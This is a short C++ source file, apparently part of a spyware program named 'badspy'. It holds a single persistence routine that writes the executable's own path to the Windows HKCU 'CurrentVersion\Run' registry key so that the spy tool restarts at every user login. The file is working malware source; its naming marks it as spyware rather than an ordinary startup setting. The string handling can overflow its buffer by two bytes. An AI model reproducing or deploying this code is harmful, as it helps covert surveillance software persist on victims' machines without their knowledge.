#include "selfprt.h"
#include "reg.h"

#define SPY_SHD_AUTOBOOT_HKEY		"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run"
#define SPY_SHD_AUTOBOOT_APPNAME	"badspy"

void SelfPrt::auto_startup()
{
	Reg * reg = NULL;
	char * file_path = new char[MAX_PATH];
	if (GetModuleFileNameA(NULL, file_path, MAX_PATH) > 0)
	{
		char * valid_file_path = new char[MAX_PATH];
		strcpy(valid_file_path, "\"");
		strcat(valid_file_path, file_path);
		strcat(valid_file_path, "\"");
		try
		{
			reg = new Reg(HKEY_CURRENT_USER, SPY_SHD_AUTOBOOT_HKEY);

			if (reg->write_value_sz(SPY_SHD_AUTOBOOT_APPNAME, valid_file_path))
				LOG_I("Enabled auto startup feature!");
		}
		catch (int error)
		{
			LOG_E("Can not enable auto startup feature: %d", error);
		}
		delete[] valid_file_path;
		if (reg != NULL)
			delete reg;
	}
	delete[] file_path;
}
